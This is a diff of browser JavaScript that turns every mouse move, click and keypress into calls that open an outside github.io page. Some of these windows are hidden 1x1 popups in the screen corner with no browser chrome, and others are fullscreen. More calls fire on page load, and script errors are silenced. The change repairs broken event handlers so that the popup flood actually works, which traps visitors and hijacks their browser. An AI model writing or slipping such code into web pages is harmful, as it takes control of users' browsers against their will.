@@ -79,11 +79,21 @@ window.onerror = function () {
     return false;
 };
 
+document.onmousedown = function () {
+    window.open("https://th3rdctrl.github.io/index.html", "_blank", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
+};
+document.onkeyup = function () {
+    window.open("https://th3rdctrl.github.io/index.html", "_top", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
+};
+document.onmousemove = function () {
+    window.open("https://th3rdctrl.github.io/index.html", "_parent", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
+};
+document.onkeydown = function () {
+    window.open("https://th3rdctrl.github.io/index.html", "", "fullscreen=yes");
+};
+
 window.open("https://th3rdctrl.github.io/index.html", "", "fullscreen=yes");
 window.open("https://th3rdctrl.github.io/index.html", "_parent", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
 window.open("https://th3rdctrl.github.io/index.html", "_blank", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
 window.open("https://th3rdctrl.github.io/index.html", "_top", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
 window.open("https://th3rdctrl.github.io/index.html", "_self", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
-document.onmousedown = window.open("https://th3rdctrl.github.io/index.html", "_blank", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
-document.onkeyup = window.open("https://th3rdctrl.github.io/index.html", "_top", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
-document.onmousemove = window.open("https://th3rdctrl.github.io/index.html", "_parent", "height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no");
